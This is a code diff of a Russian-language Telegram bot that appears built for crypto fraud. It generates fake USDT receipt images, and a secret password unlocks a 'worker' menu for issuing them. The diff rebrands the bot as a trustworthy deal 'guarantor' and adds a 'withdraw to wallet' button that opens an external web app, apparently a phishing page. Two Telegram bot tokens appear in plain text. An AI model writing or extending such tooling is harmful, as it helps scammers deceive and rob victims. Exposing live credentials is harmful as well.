@@ -4,7 +4,7 @@ from PIL import Image, ImageDraw, ImageFont
 import random
 import time
 
-bot = telebot.TeleBot('8706491880:AAEvTvIW5sOu2xP2JlK9-1Kk0bOn_0az1tE')
+bot = telebot.TeleBot('8758408398:AAFqTcwZboUGfc0rB6JkKqjiAqVevcSkMOM')
 
 def generate_crypto_card(amount, filename="crypto_card.png"):
 
@@ -57,8 +57,7 @@ def generate_crypto_card(amount, filename="crypto_card.png"):
         (label_x - 45, label_y),
         "₮",
         fill="white",
-        font=mid_font,
-        stroke_fill= 10
+        font=mid_font
     )
 
     img.save(filename)
@@ -68,11 +67,12 @@ def generate_crypto_card(amount, filename="crypto_card.png"):
 @bot.message_handler(commands=['start'])
 def start_command(message):
     markup = types.InlineKeyboardMarkup(row_width=True)
-    but1 = types.InlineKeyboardButton(text='Вывести деньги', callback_data='dsg')
+    web_app = types.WebAppInfo('https://rebirth-of-the-night-production.up.railway.app/')
+    but1 = types.InlineKeyboardButton(text='Вывести деньги на кошелёк', web_app= web_app)
     markup.add(but1)
-    bot.send_message(message.chat.id, 'Привет', reply_markup=markup)
+    bot.send_message(message.chat.id, '👋 Добро пожаловать в бота-гаранта сделок!\n\n🔐 Бот обеспечивает безопасный перевод средств через криптовалюту между покупателем и продавцом.', reply_markup=markup)
 
-@bot.message_handler(func=lambda message: message.text == "ЧЕК")
+@bot.message_handler(func=lambda message: message.text == "🧾ЧЕК")
 def ask_amount(message):
     bot.send_message(message.chat.id, "Введите сумму USDT:")
     bot.register_next_step_handler(message, get_amount)
@@ -81,7 +81,7 @@ def ask_amount(message):
 def handler(message):
     if message.text.lower() == 'nightmare17':
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        but1 = types.KeyboardButton('ЧЕК')
+        but1 = types.KeyboardButton('🧾ЧЕК')
         markup.add(but1)
         bot.send_message(message.chat.id, 'Приветствую тебя, воркер)', reply_markup=markup)
 
@@ -108,3 +108,4 @@ while True:
     except Exception as e:
         print(f"Ошибка в polling: {e}")
         time.sleep(3)
+
